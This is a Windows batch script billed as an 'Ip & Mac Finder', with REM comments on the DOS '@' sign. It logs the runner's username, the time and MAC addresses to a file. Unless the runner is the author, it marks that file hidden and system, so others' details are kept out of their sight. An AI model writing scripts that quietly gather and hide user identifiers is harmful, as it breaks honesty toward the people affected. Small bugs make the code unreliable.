
REM [ @ ] (Asperand or At) This sign is used in batch files to prevent the text following it on the same line from being displayed
REM on the screen. An example is "ECHO OFF". It is used at the start of most batch files to turn off screen echoing (displaying)
REM for all lines following. Employing `@' with it as "@ECHO OFF", will prevent this Asperand and the words "Echo Off" from
REM appearing on screen.
REM As well as the above, `@' is used by 4DOS to designate variable functions. "@FILEDATE" will return a file's date, as an
REM example.
REM Finally, the `@ sign is employed to designate file lists in many versions of DOS. "DEL @FILENAME.lst" means that DOS
REM will delete the files listed in "FILENAME.lst".

	@ECHO OFF
	CLS
	title Ip ^& Mac Finder
	setlocal enabledelayedexpansion
	:menu
	echo.
	echo.
	echo Do you want Execute the SCRIPTS (y/n)^?
		set /p "_var=Type (y/n)==> "
	
	if /i "!_var:~0,1!" == "y" (
				echo %time% >"%~dp0\_%USERNAME%.txt"
				echo. >>"%~dp0\_%username%.txt"
				echo Current user's name: %username% >>"%~dp0\_%USERNAME%.txt"
				echo. >>"%~dp0\_%USERNAME%%.txt"
			for /f "tokens=11 delims=: " %%G in ('ipconfig /all ^| FIND "Physical Address"') do (
				set /a found+=1
				
				if "!found!" == "1" (
					Set mac=WLAN
				
				) ELSE (
					set mac=LAN
				)
				rem -------------------------
				echo !mac! Mac Address is: %%G
				rem -------------------------
				if !found! equ 2 (
					goto :exit
				)
				rem -------------------------
			) >>"%~dp0\_%USERNAME%.txt"
	
	) else if /i "!_var:~0,1!" == "n" (
		echo.
		echo.
		echo You Entered No 
		pause >nul
		goto :eof
	) else (
		echo.
		echo.
		echo YOU ENTERED INVALID VALUE
		pause >nul
		goto :menu
	)
	
:exit
	REM D -^> DRIVER LETTER
	REM P -^> FILE PATH
	REM 0 -^> EXECUTED FILE ^(PARAMETRE %0^)
	IF /i "%username%" == "Ivandrofly" (
		"%~dp0\_%Username%.txt"
		exit /b
	) else (
		attrib +h +a +s "%~dp0\_%USERNAME%.txt"
	)